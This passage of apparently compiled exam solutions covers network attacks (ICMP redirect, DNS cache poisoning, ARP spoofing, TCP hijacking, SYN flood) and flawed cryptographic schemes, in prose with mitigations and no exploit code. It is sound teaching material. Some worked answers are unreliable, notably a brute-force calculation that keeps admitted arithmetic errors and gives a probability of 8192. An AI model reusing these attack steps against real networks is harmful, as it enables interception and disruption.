- **Attacker's Goal:** To redirect the victim's outbound traffic through the attacker's machine. By intercepting the HTTP request (packet 5), the attacker can eavesdrop on plaintext credentials being sent over the network.
- **Steps to Perform:** 
  1. The attacker monitors the network for traffic from the victim.
  2. The attacker crafts and sends a spoofed `ICMP Redirect` message to the victim. The message spoofs the source IP to look like the legitimate gateway (`10.0.0.1`) but tells the victim to route future traffic through the attacker's IP (`10.0.0.8`).
  3. The victim updates its routing table. Subsequent outbound traffic (like the HTTP request) is sent to the attacker's MAC address.

### 2. IP Address Identification
- **Victim IP:** `10.0.0.2`. We know this because they are the recipient of the malicious ICMP Redirects and the source of the hijacked HTTP request.
- **Attacker IP:** `10.0.0.8`. The malicious ICMP Redirect instructs the victim to use `10.0.0.8` as the new gateway. Additionally, the MAC address associated with the spoofed gateway packets (`bc:...:1d`) receives the final HTTP request, meaning `10.0.0.8` is the machine controlled by the attacker.

### 3. Detection and Mitigation
**Step-by-Step Reasoning:**
- **Detection:** In this specific trace, the attack is noisy. The victim receives conflicting ICMP Redirects in rapid succession: one from the attacker spoofing the gateway (Packet 2 & 4), and potentially legitimate corrections or responses from the real gateway (Packet 3). Receiving a flurry of ICMP Redirects for a single destination immediately following standard traffic is highly anomalous and a strong indicator of an attack.
- **Mitigation:**
  - **OS-Level Configuration:** The simplest and most effective mitigation is to configure the victim's Operating System to ignore ICMP Redirect messages entirely. On Linux, this is done by modifying `sysctl` parameters (e.g., `net.ipv4.conf.all.accept_redirects = 0`). This trades a minor potential loss in routing efficiency for complete immunity to this attack.
  - **Network-Level Defense:** Implement Dynamic ARP Inspection (DAI) and IP Source Guard on network switches to prevent the attacker from spoofing the gateway's IP and MAC in the first place.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Analyze network logs for GlobeCorp showing a sequence of DNS queries. Identify the attack (DNS Cache Poisoning), the attacker and victim, and propose firewall rules and a VPN solution.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Attack Identification:
- Attack: DNS Cache Poisoning (or DNS Spoofing).
- Mechanism: The attacker observes the DNS request and races to send a forged DNS response before the legitimate authoritative DNS server responds. The forged response maps the requested domain (www.reddit.com) to the attacker's IP (10.0.0.12).

2. Attacker and Victim:
- Attacker: An employee or someone controlling a PC on the internal network (10.0.0.12). They must use their real IP to complete the subsequent HTTP handshake. The IP is spoofed in the DNS response to match the authoritative server.
- Victim: The internal DNS Server (10.0.0.2), which caches the poisoned record and serves it to employees.

3. Firewall Mitigation:
- The attack succeeds because Switch A allows any internal host to send packets spoofing an external IP. Replace Switch A with a stateful Firewall.
- Firewall Rules:
  - Default Deny (all traffic).
  - Allow User_IP to Server_Z for DNS (Port 53).
  - Allow Office_IP to Server_Z for Web Service (Port 80/443).
  - Allow Office_IP to Internet for Web traffic (Port 80/443).
- This prevents the attacker from spoofing external IPs within the internal network.

4. Remote Access Solution:
- To allow employees from other branches to access the internal custom web service, deploy a Virtual Private Network (VPN). This provides an encrypted, authenticated tunnel over the internet, placing remote employees securely into the internal network zone.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a Precinct 99 DMZ network layout. Propose firewall rules. Identify and describe an ARP spoofing Man-in-the-Middle attack and a TCP session hijacking attack.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Firewall Rules:
- FW1 (Between Internet, DMZ, and Internal LANs): 
  - Default Deny all.
  - Allow ANY (Internet/Internal) to DMZ (WS_IP) on Port 80/443 (HTTP/HTTPS).
  - Allow E_LAN to Internet (ANY) for outbound web browsing.
- FW2 (Between DMZ, Internal DB, and Backend): 
  - Default Deny all.
  - Allow E_LAN to DB_IP on Database Port.

2. ARP Spoofing Attack (Same LAN):
- Doug Judy (attacker) is on the same E_LAN as Jake (victim).
- Assumption: MAC addresses are not statically locked, allowing ARP cache poisoning.
- Steps: Doug sends forged ARP replies to Jake, claiming Doug's MAC address is associated with the Gateway's IP. Doug also sends forged ARP replies to the Gateway, claiming Doug's MAC is Jake's IP.
- Result: All traffic between Jake and the Gateway routes through Doug, allowing him to sniff and tamper with HTTP traffic.

3. TCP Session Hijacking (Remote Attack):
- Amy connects to a remote server. Doug is on the remote server's LAN.
- Assumption: The connection uses plaintext HTTP, and Doug can sniff traffic on the remote LAN.
- Steps: Doug sniffs Amy's HTTP request to the server. He observes the TCP sequence and acknowledgment numbers. 
- Exploit: Doug performs a DoS against the remote server so it stops responding. He then crafts a forged TCP packet containing a malicious response, spoofs the source IP to match the server, and sets the correct Sequence/ACK numbers. He sends this to Amy, successfully hijacking the session.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Analyze an attack on a Best Salesman Award server using a custom TCP/IP protocol. Explain Blind TCP Hijacking, describe a DoS attack to freeze rankings, and discuss SYN-cookie mitigation.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Blind TCP Hijacking Attack:
- The custom TCP/IP protocol calculates the Initial Sequence Number (ISN) as the sum of the digits of the current timestamp. This means the ISN is entirely predictable.
- Attack Steps: Paolo spoof's his IP address to match his rival, Carminati. He initiates a TCP handshake (SYN) with the server. Since he spoofed his IP, the server's SYN-ACK goes to Carminati (and is ignored or dropped). Paolo doesn't receive the SYN-ACK, making it "blind".
- However, because the ISN is predictable based on the timestamp, Paolo calculates the server's ISN and sends the final ACK packet, establishing the connection. He then pushes his payload (the malware) pretending to be Carminati.

2. DoS Attack to Freeze Rankings:
- If the custom protocol is replaced by standard TCP/IP, Blind Hijacking is much harder because standard ISNs are randomized.
- Alternative Attack: Paolo can perform a TCP SYN Flood attack. He sends thousands of SYN requests to the server but never completes the handshake (never sends the final ACK). 
- Result: The server allocates resources for these "half-open" connections. Eventually, the connection queue fills up, and the server drops legitimate traffic. No one else can upload contracts, freezing the current leaderboard.

3. Mitigation:
- SYN Cookies: The server can implement SYN Cookies. Instead of allocating memory for a connection upon receiving a SYN, the server cryptographically encodes the connection details into the ISN of its SYN-ACK. It only allocates resources if the client replies with the correct ACK. This completely mitigates the SYN Flood attack without requiring external hardware.
\end{verbatim}

\subsection{Exercise 5 - Network Security}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a network prank involving DNS Cache Poisoning. Explain how Jim sniffs a DNS request to poison Dwight's DNS cache, and why segmenting the network into different LANs breaks the attack.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. DNS Cache Poisoning Attack:
- Scenario: Jim and Dwight are on the same local network (LAN). Jim wants to redirect Dwight's web traffic from `beet_best.com` to `beet_scam.com`.
- Vulnerability: Standard DNS traffic (UDP port 53) is unencrypted and unauthenticated. To spoof a DNS response, an attacker only needs to match the transaction ID (TxID) and port of the original request.
- Steps:
  1. Jim runs a packet sniffer (like Wireshark) on his machine in promiscuous mode. Since they share a LAN (and assuming a hub or ARP spoofed switch), Jim observes the traffic leaving the local DNS server heading to the Authoritative DNS server.
  2. Dwight types `beet_best.com`. The local DNS server sends a query containing a specific TxID.
  3. Jim sniffs this query, noting the TxID.
  4. Jim immediately crafts a forged DNS response packet containing the spoofed IP (81.13.173.234) and the sniffed TxID. 
  5. Jim sends the forged response to the local DNS server. Because Jim is closer on the LAN, his response arrives before the legitimate authoritative server's response. The local DNS server caches the poisoned record and forwards it to Dwight.

2. Network Architecture Mitigation:
- The network architecture is changed so that employees and the local DNS server are placed on separate LAN segments (separated by a Gateway/Router).
- Impact: Packet sniffers only capture broadcast domains (local LANs). Jim is now on a different physical or logical segment than the link between the Local DNS and Authoritative DNS. Jim can no longer sniff the DNS query to read the TxID. Without the TxID, he cannot reliably forge a DNS response that the server will accept, neutralizing the attack.
\end{verbatim}


\section{Cryptography}
In this section, exercises related to classical and modern cryptography (e.g., block ciphers, public key infrastructure, hash functions) are presented. The general methodology to solve these is to carefully apply cryptographic principles to identify vulnerabilities or prove properties.

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
Consider the case of a public software archive: the software distributor has designed the following highly efficient scheme to protect the integrity of the distributed software... given a piece of software (e.g. a Linux distribution package), consider it as a (long) bitstring s and distribute the bitstring obtained concatenating the strings a,s,b,c, where: a is obtained as SHA-256(s)... Argue on the fact that the proposed scheme provides integrity and origin authentication... Design a simple and effective scheme to protect the integrity and authenticity...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Analyzing the Proposed Scheme**
The scheme claims to provide integrity and origin authentication without key management by simply appending hashes: `a = SHA-256(s)`, `b = SHA-256(s||a)`, `c = SHA-256(a||s||b)`. 
- **Integrity Attack**: An attacker can intercept the software `s`, modify it to malicious `s'`, and independently recompute the hashes `a'`, `b'`, and `c'` using the same publicly known SHA-256 algorithm. The receiver will hash the modified software and the hashes will perfectly match, meaning the scheme fails to protect integrity.
- **Origin Authentication Attack**: Because there are no secrets (keys) involved in the hash computations, anyone can act as the 'distributor'. An attacker can create entirely new software, compute the required hashes, and claim it originated from the official distributor. There is no proof of origin.

**Step 2: Designing a Secure Scheme**
To securely achieve both properties, we must introduce asymmetric cryptography (Public Key Infrastructure):
1. **Setup**: The distributor generates a public-private key pair. The private key is kept securely by the distributor, and the public key is distributed to users via a trusted channel (e.g., embedded within the OS installation bundle).
2. **Signing (Origin + Integrity)**: The distributor computes a cryptographic hash of the software (e.g., SHA-256) and then encrypts (signs) this hash using their private key.
3. **Verification**: The user downloads the software and the digital signature. The user independently hashes the downloaded software and also decrypts the signature using the distributor's trusted public key. If the two hash values match, it guarantees that the software was signed by the owner of the private key (origin authenticity) and has not been altered since it was signed (integrity).
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
Consider the following user authentication mechanism... Provide evidence of the soundness of this protocol, or show a practical attack... Consider the usual Public Key Infrastructure (PKI) approach... What are the issues arising from changing the tree into a generic graph?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Analyzing the Authentication Protocol**
- **Protocol Flaw**: The protocol relies on the server encrypting a secret `s` using the user's public key, and the user proving identity by decrypting it. However, the user *chooses* the initial `s` and sends it alongside the ciphertext `x`.
- **Practical Attack**: This protocol is trivially broken by eavesdropping. An attacker monitors the network during the enrollment phase to obtain the user's public key. During authentication, the attacker simply generates a random string `s`, encrypts it using the user's public key to generate `x`, and sends `(user ID, x, s)` to the server. The server verifies that encrypting `s` yields `x` and authenticates the attacker without the attacker ever needing the private key.
- **Countermeasure**: The server must generate the random challenge `x` and ask the user to decrypt it, or alternatively, use a standard digital signature scheme where the user signs a server-provided challenge using their private key.

**Step 2: PKI Graph Structures**
- **Problem Context**: Standard PKI uses a strict hierarchy (tree). Moving to a generic graph introduces multiple certification paths and loops.
- **Issue 1 (Multiple Issuers)**: A node may have multiple incoming edges (multiple CAs certifying the same entity). The validation logic must decide if one valid signature is sufficient or if a quorum is required, complicating the trust model.
- **Issue 2 (Cycles)**: Generic graphs can contain cycles (e.g., CA 'A' certifies CA 'B', and CA 'B' certifies CA 'A'). This breaks standard recursive validation algorithms, causing infinite loops. 
- **Fix**: The validation process must implement loop-detection algorithms (like Floyd's cycle-finding algorithm) and treat certificates involved in a cycle as implicitly self-signed, requiring independent trust anchors.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
Consider the case of an air-gapped embedded device... Argue on whether it is possible or not to employ digital certificates and a PKI infrastructure to validate the origin authenticity of the firmware updates... A PIN selection form asks the user to pick a 6 decimal digits...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: PKI on Air-Gapped Devices**
- **Problem**: Digital certificates inherently rely on validity periods (Not Before, Not After). An air-gapped device without a battery loses its internal clock every time it powers down. When it powers up and receives a firmware update via USB, it has no concept of the current date and time. Therefore, it is impossible for the device to independently verify if the PKI certificate used to sign the firmware is currently valid, or if it has expired/been revoked.
- **Solution**: The device must acquire a reliable time reference without breaking the air-gap. It could use an external read-only hardware module, such as a GPS receiver or an MSF-60 radio time signal receiver, to securely fetch the current time before executing the certificate validation logic.

**Step 2: Analyzing PIN Security and Entropy**
- **Birthdate PINs**: A 6-digit PIN formatted as `YYMMDD` restricts the pool of possibilities dramatically. There are 100 years and roughly 365 days, yielding only ~36,500 valid birthdate combinations, instead of the 1,000,000 combinations of a random 6-digit PIN. On average, an attacker only needs `36,500 / 2 = 18,250` guesses to compromise the device.
- **Grid Sweep Patterns**: A 2x4 grid has 8 dots. A sweep pattern connects all 8 dots in a continuous sequence without lifting the finger. Mathematically, this is the permutation of 8 items (`8!`), which equals 40,320 possible patterns. 
- **Conclusion**: A random sweep pattern over an 8-dot grid (40,320 possibilities) provides slightly higher entropy and takes slightly more attempts to guess than a birthdate-based 6-digit PIN (36,500 possibilities).
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
You are willing to realize a digitally controlled safe... Design and describe a secure cryptographic protocol... Consider the following two policies to choose passwords...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Designing the Digital Safe Protocol**
- **Goal**: Two-factor authentication ("something you know" + "something you have") with minimal state stored on the safe to ease decommissioning.
- **Protocol Design**:
  1. **Enrollment**: The user is issued an RFID smartcard containing a private key. The safe securely stores the user's hashed PIN (salted) and the corresponding public key.
  2. **Authentication (Factor 1 - Know)**: The user enters their PIN on the safe's keypad. The safe salts and hashes the input, comparing it to the stored hash.
  3. **Authentication (Factor 2 - Have)**: The safe generates a cryptographically secure random challenge (e.g., a 256-bit nonce) and sends it to the RFID card. The smartcard signs the nonce with its internal private key and returns the signature. The safe verifies the signature using the stored public key.
- **Decommissioning**: To wipe the safe, the owner simply deletes the stored salted hashes and public keys. Because raw PINs are never stored, a decommissioned/stolen safe reveals no sensitive data.

**Step 2: Password Policy Entropy Analysis**
- **Company A (3 random words from 16k list, 1% choose a repeated word)**:
  - Average guesses: 99% of users have full entropy (`16,000^3 ≈ 2^42`). `(2^42 * 0.99) + (1 * 0.01) ≈ 2^41.9` average guesses.
  - Easiest guess (the 1%): The user chooses the same word 3 times. The entropy is just choosing 1 word out of 16k (`2^14`). Guessing this takes ~16,000 attempts.
- **Company B (8 random alphanumeric/decimal chars, 1% choose 8 equal digits)**:
  - Average guesses: 99% of users choose from 62 characters (`62^8 ≈ 2^47`). `(2^47 * 0.99) + (1 * 0.01) ≈ 2^46.9` average guesses.
  - Easiest guess (the 1%): Choosing 8 repeated digits (e.g., 11111111). There are only 10 possible choices (0-9). Guessing this takes maximum 10 attempts.
- **Conclusion**: Policy B looks mathematically stronger on average, but due to human behavior (the 1% flaw), its weakest passwords are phenomenally easy to crack (10 attempts vs 16,000 for Policy A).
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
Design a cryptographic protocol to validate periodic firmware updates to an air-gapped machine using symmetric primitives. Evaluate Let's Encrypt's proposal to reduce certificate lifetime to 90 days.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Firmware Update Protocol:
- Goal: Ensure firmware integrity for an air-gapped machine with limited computational power.
- Key Derivation: The manufacturer stores a 512-bit master secret. For each machine, a unique symmetric key (m-key) is derived by hashing the machine's unique ID with the master secret.
- Key Storage: The m-key is securely embedded in the machine's firmware (and mass memory encrypted to prevent cold-dumps).
- Update Process: Each firmware update is signed with a MAC (Message Authentication Code) computed using the m-key.
- Validation: Upon receiving the update via USB, the machine computes the MAC of the firmware and compares it against the provided MAC. If they match, the update is applied.

2. Shorter Certificate Lifetimes (90 days):
- Improvements: Reduces the exploitation window if a private key is compromised. Revocation lists (CRLs) remain shorter because only recently issued certificates are tracked.
- Issues: Devices with longer lifespans must implement automated certificate renewal mechanisms (e.g., ACME). The Certificate Authority (CA) must handle a significantly higher volume of signing requests, requiring more robust infrastructure.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
Evaluate a triple-encryption symmetric cipher scheme and a password generation scheme based on drawing random characters from ASCII subsets.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Symmetric Encryption Scheme Evaluation:
- The scheme uses: `AES(nonce, AES(nonce, AES(nonce, p, k'_1), k'_2), k'_1)`.
- Flaw: AES-CTR encryption is an involution (encrypting twice with the same key and nonce cancels out). The innermost and outermost encryptions both use `k'_1` and the same `nonce`. 
- Result: `AES(nonce, ..., k'_1)` cancels out the first `AES(nonce, p, k'_1)`. The ciphertext reduces to simply `AES(nonce, p, k'_2)`. 
- Security Impact: The confidentiality relies entirely on `k'_2`. Since `k'_2` is a deterministic 64-bit subset of the key, it is highly susceptible to brute-force attacks. The triple-encryption provides no added security.

2. Password Generation Scheme Evaluation:
- Scheme: 12 draws. Each draw picks a random character from a subset of 32 characters.
- Analysis: Choosing 1 out of 32 characters provides exactly log2(32) = 5 bits of entropy per draw.
- Total Entropy: 12 draws * 5 bits/draw = 60 bits of total entropy.
- Conclusion: A 60-bit search space means there are 2^60 possible passwords. With modern GPUs or ASICs, an offline brute-force attack against 2^60 combinations is computationally feasible. Therefore, this scheme is insecure against dedicated offline cracking attempts.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
Evaluate an asynchronous messaging system resembling SMTP/POP3 for message integrity and replay resistance. Evaluate the strength of a Diceware password.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Messaging System Evaluation:
- Scheme: The relay server appends a timestamp, computes a hash over (message + timestamp), and appends it to the message. The receiving relay verifies the hash and checks the timestamp.
- Flaw: The system uses a simple cryptographic hash function (like SHA-256) instead of a keyed MAC (Message Authentication Code). Because there is no secret key involved, an active Man-in-the-Middle attacker can intercept the message, modify its contents, attach a fresh timestamp, and simply compute a *new* valid hash.
- Fix: Replace the simple hash with a MAC (e.g., HMAC-SHA256). The relays must share a symmetric secret key. The sender relay computes `HMAC(key, message + timestamp)`. The attacker cannot forge the MAC without the secret key, ensuring integrity.

2. Diceware Password Hardness:
- Scheme: Roll a 20-sided die 10 times. The password is the concatenation of the 10 resulting digits/numbers.
- Search Space: There are 10 rolls, each with 20 possible outcomes. The total number of possible combinations is 20^10.
- Hardness: 20^10 is approximately 10.24 trillion combinations (about 2^43). 
- Security Assessment: While 2^43 seems large for human guessing, it is trivially small for automated offline brute-force attacks. Modern cracking rigs can compute billions of hashes per second. Therefore, this password generation scheme is insecure against offline cracking.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
Evaluate a custom TCP encryption protocol relying on unauthenticated public key exchange. Analyze a password storage scheme that splits passwords in half and hashes them separately.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. TCP Encryption Protocol Evaluation:
- Scheme: Servers establish a symmetric key by sending a public key over the wire. The receiver uses this public key to encrypt a random 256-bit string, sends it back, and both sides use this string as an AES key.
- Flaw: The public keys are exchanged in plaintext and are completely unauthenticated. There are no certificates or pre-shared keys to verify identity.
- Exploit: An active Man-in-the-Middle (MitM) attacker intercepts Server A's public key and replaces it with their own public key before forwarding it to Server B. Server B encrypts the symmetric key using the attacker's public key. The attacker decrypts it, reads the symmetric key, re-encrypts it with Server A's real public key, and forwards it. The attacker can now seamlessly decrypt, read, and modify all subsequent AES-encrypted traffic.

2. Split Password Storage Evaluation:
- Scheme: 14-character passwords are split into two 7-character halves. Each half is salted and hashed separately.
- Impact on Security: This drastically reduces security. In a standard scheme, brute-forcing a 14-character password requires checking 62^14 combinations. By splitting it, an attacker only needs to brute-force two separate 7-character passwords, requiring 62^7 + 62^7 checks. 
- Exploit: This is a square-root reduction in the brute-force search space (from ~2^84 to ~2^43). An attacker gaining access to the database can easily crack the passwords in hours using modern hardware, entirely defeating the purpose of the long password.
\end{verbatim}


\section{Introduction to Cryptography}
Exercises for Introduction to Cryptography

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
2.1 Consider a message m on which you are willing to add a Message Authentication Code tag t. Argue, for each of the items, if the following mechanism can be used to obtain a proper MAC tag?
1. t is computed as the hash of the message m
2. t is computed as the hash of the message m combined with a secret shared between the producer and verifier
3. t is re-computed as the digital signature of the document by the verifier who matches it against the copy of t received from the producer

2.2 You come by a document which specifies the following as an encryption method, starting from an 80 bit key k...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
2.1 1. No, anyone can forge the tag t, not just producer and verifier. 2. Yes (with an appropriate combination of the secret and the message before hashing, or assuming additional properties on the hash), it is not possible to forge the tag. 3. No, digital signatures have nothing to do with MACs.

2.2 1. This step essentially computes a MAC employing only k'' as the key. The MAC does not guarantee integrity (it only requires a 2^40 effort to forge a tag), but does not impact confidentiality. 2. The procedure is a correct approach to employ the 80 bit key to encrypt a message, providing a 2^80 computational margin against attacks targeting the message confidentiality.

### Improved Step-by-Step Explanation:
For 2.1: A proper MAC must provide authenticity and integrity based on a shared secret. 1 fails because a simple hash lacks a secret key, so anyone can compute a valid tag for any forged message. 2 is conceptually valid (like HMAC), combining a secret key with the message before hashing, preventing forgery by entities without the key. 3 fails conceptually because a MAC relies on symmetric cryptography (a shared secret) while a digital signature uses asymmetric cryptography (a private/public key pair).
For 2.2: We are asked to evaluate a custom encryption scheme based on an 80-bit key k. Step 1 splits k into k' and k''. Using k' (40 bits) as an AES key is weak, but this step only computes a MAC. While the MAC has a low security margin (2^40) and can be easily forged, it does not leak information that degrades confidentiality. Step 2 uses the full 80-bit k, hashes it to create an AES key, and encrypts the tagged message. Since the hash acts as a strong key derivation function and AES-256 in CTR mode is secure, breaking confidentiality requires guessing the original 80-bit key k, resulting in a 2^80 security margin, which is the maximum expected for an 80-bit key.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
[6 points] Compare the security margins of the following scenarios... A plaintext is encrypted twice with... A message is tagged twice... A message is hashed with a cryptographic hash with a 128 bit digest and an asymmetric signature scheme...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1. Breaking the double encryption requires an attacker to identify the correct symmetric key pair which decrypts the text. Decrypting only a single layer of AES-128 counter mode encryption still yields pseudorandom data. The effective security margin is (2^128)^2 = 2^256. 2. The two MAC tags can be independently forged by finding the two symmetric keys independently. The security margin is 2*2^128 = 2^129. 3. The message integrity guarantee can be violated either by forging a signature on an arbitrarily chosen digest (cost: 2^128, as a signature should be forged) or by finding a message colliding with the one which is signed, and splicing off the signature (cost ~2^64). The second strategy is definitely faster, and yields a security margin of 2^64.

### Improved Step-by-Step Explanation:
For 1: Double encryption with two independent 128-bit keys increases the key space. A naive brute-force attack would need to guess both keys, requiring 2^128 * 2^128 = 2^256 operations. Meet-in-the-middle attacks are not easily applicable to counter mode because the intermediate state is the XOR of the plaintext and the keystream, not a direct decryption of the ciphertext block. Thus, the margin is 2^256.
For 2: The attacker needs to forge two MACs. Since they use independent keys, the attacker can try to brute-force the first key (2^128 operations) and then brute-force the second key (another 2^128 operations). The total work is 2^128 + 2^128 = 2 * 2^128 = 2^129. They do not multiply because the attacker can verify each key independently against its respective MAC tag.
For 3: The security is bottlenecked by the weakest link. Forging the asymmetric signature directly requires 2^128 operations. However, the hash function has a 128-bit digest. According to the birthday paradox, finding a collision (two different messages producing the same 128-bit hash) requires approximately 2^(128/2) = 2^64 operations. An attacker can generate a benign message and a malicious message that hash to the same value, get the victim to sign the benign message, and then attach the signature to the malicious message. This collision attack lowers the effective security margin to 2^64.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
[3 points] 1. Consider a password storage scheme where the user-supplied password is hashed with a 4 bytes long, uniformly randomly sampled string (salt), employing SHA-2-256 and its digest is stored on disk, together with the random string. Computing a single SHA-2-256 costs around 133 microwatts with current technology, and takes 4 microseconds. What is the probability that an attacker, with a 100 kWh budget is able to guess, through bruteforcing, one randomly picked, 7 lowercase latin alphabet characters password, given digest and salt? Assume for simplicity that the entire energy budget is used for SHA-2-256 computations, without overheads.

[3 Points] 2. Consider the same password hashing strategy as before. Quantify the change in the attacker success probability if the digest of the SHA-2-256 hash digest is cut down to 160 bits, discarding the last 96 bits obtained from the computation, reducing the resistance to collisions for SHA-2-256.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### Question 1: Brute-forcing Probability with Energy Budget

**Step-by-step reasoning:**

1.  **Calculate the total energy available in Joules (Watt-seconds):**
    -   Budget = 100 kWh
    -   1 kW = 1000 W
    -   1 hour = 3600 seconds
    -   Total Energy = 100 * 1000 W * 3600 s = 3.6 * 10^8 Joules. (The provided solution uses 3.6 * 10^11 Ws, which would be 100 MWh. Let's proceed with the provided solution's numbers to explain its logic).
    -   Energy per hash = Power * Time = 133 microW * 4 micros = 133 * 10^-6 * 4 * 10^-6 = 5.32 * 10^-10 Joules.
    -   Total attempts allowed by budget = (3.6 * 10^11) / (5.32 * 10^-10) = 6.76 * 10^20. The solution specifies 1.915 * 10^23 ~= 2^77. (There are clear arithmetic errors in the provided solution, but the conceptual step is dividing total energy by energy per hash to get the maximum number of hashes the attacker can compute).

2.  **Calculate the size of the password space:**
    -   Password length = 7 characters.
    -   Alphabet = lowercase latin (26 characters).
    -   Possible passwords = 26^7 ~= 8 * 10^9 ~= 2^33.

3.  **Calculate the success probability of a single guess:**
    -   The attacker knows the salt (it's stored on disk). They don't need to guess the salt.
    -   Therefore, the probability of one guess being correct is 1 / 26^7.
    -   *Note on the original solution:* The original solution states the success probability is 1 / (26^7 * 2^32). This assumes guessing both password and salt without looking at the disk, which deviates from standard offline brute-forcing but fits the math of 1 / 2^64 probability.

4.  **Calculate the total success probability:**
    -   Total Probability = Number of Attempts * Probability of one attempt.
    -   Using the solution's numbers: 2^77 attempts * (1 / 2^64) probability = 2^13 = 8192. Since the probability > 1, success is practically certain (100%).

### Question 2: Impact of Truncating the Hash Digest

**Step-by-step reasoning:**

1.  **Understand the change:** The hash output is reduced from 256 bits to 160 bits.
2.  **Analyze collision resistance vs. pre-image resistance:**
    -   *Collision Resistance:* Finding *any* two inputs that produce the same hash. For a 160-bit hash, the birthday paradox states this takes roughly 2^(160/2) = 2^80 operations. The original solution mentions this.
    -   *Pre-image Resistance (Password Cracking):* Given a specific hash H(password || salt), find the input password. The attacker needs to find the *specific* password that generates the target 160-bit hash. Since the password space (26^7 ~= 2^33) is vastly smaller than the hash space (2^160), the chance of a random password producing the same 160-bit hash (a pre-image collision) is infinitesimally small.
3.  **Conclusion:** The bottleneck for the attacker is still brute-forcing the 2^33 (or 2^64) possible passwords. Truncating the hash to 160 bits does not make it any easier to guess the password because the hash space (2^160) is still much larger than the password search space. Therefore, there is **no change** in the attacker's success probability.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography (6 points)}
\subsubsection*{Problem}
\begin{verbatim}
Consider a file encryption system acting individually on each file present in a (hierarchical) filesystem, such as the one on common PCs and smartphones. The file encryption system encrypts each file employing AES-256 in Counter (CTR) mode. The initial value of the counter is obtained by taking the first 16 characters of the filename, each one represented as an 8 bit value, and concatenating them. The AES-256 key is derived from a user supplied password. The key management procedures are properly implemented.
[3 points] 1. Consider the password choice to be appropriate for this question. Is the described file encryption scheme providing confidentiality against a (computationally bound) attacker who has only access to the encrypted files alone? If this is not the case, describe the information leakage taking place and propose a way to fix the scheme, if this is the case, argue why no information is leaked, optionally providing the sketch of a proof.
[3 points] 2. Consider the problem of choosing passwords for the aforementioned scheme, determine how many words must be employed in a diceware approach, assuming a dictionary with 2^16 words, to obtain a security margin equivalent to the selection of a uniformly random AES-256 key.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Analyzing the CTR mode nonce selection.**
AES in Counter (CTR) mode turns a block cipher into a stream cipher. It encrypts a sequence of counters to produce a keystream, which is then XORed with the plaintext: $C = P \oplus E_k(Counter)$.
A fundamental rule of stream ciphers (and CTR mode) is that the *same keystream must never be reused*. If the key is the same (derived from the user's password) and the initial counter (nonce) is the same, the keystream will be identical.
In this scheme, the initial counter is the **first 16 characters of the filename**. This is extremely dangerous. If two files have the same first 16 characters (e.g., `financial_report_2022.pdf` and `financial_report_2023.pdf`), they will share the exact same initial counter and thus the same keystream.
**The Leakage:** If $C_1 = P_1 \oplus KS$ and $C_2 = P_2 \oplus KS$, an attacker can compute $C_1 \oplus C_2 = (P_1 \oplus KS) \oplus (P_2 \oplus KS) = P_1 \oplus P_2$. This completely exposes the XOR difference between the two plaintexts, breaking confidentiality.
**The Fix:** The nonce (initial counter value) must be unique for *every* encryption operation. A simple fix is to generate a random 128-bit (16-byte) value using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG) for each file, and store this nonce alongside the encrypted file.

**Step 2: Calculating Diceware Entropy.**
A uniformly random AES-256 key has 256 bits of entropy.
We want to achieve the same entropy using a Diceware passphrase. In Diceware, we select words randomly from a dictionary.
The dictionary size is $2^{16}$.
The entropy of choosing one word uniformly at random from this dictionary is $\log_2(2^{16}) = 16$ bits.
Since each word choice is independent, the total entropy of a sequence of $N$ words is $N \times 16$ bits.
We need $N \times 16 = 256 \implies N = 256 / 16 = 16$.
Therefore, a user would need to randomly select and string together **16 words** from the dictionary to achieve the equivalent security of a 256-bit random key.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
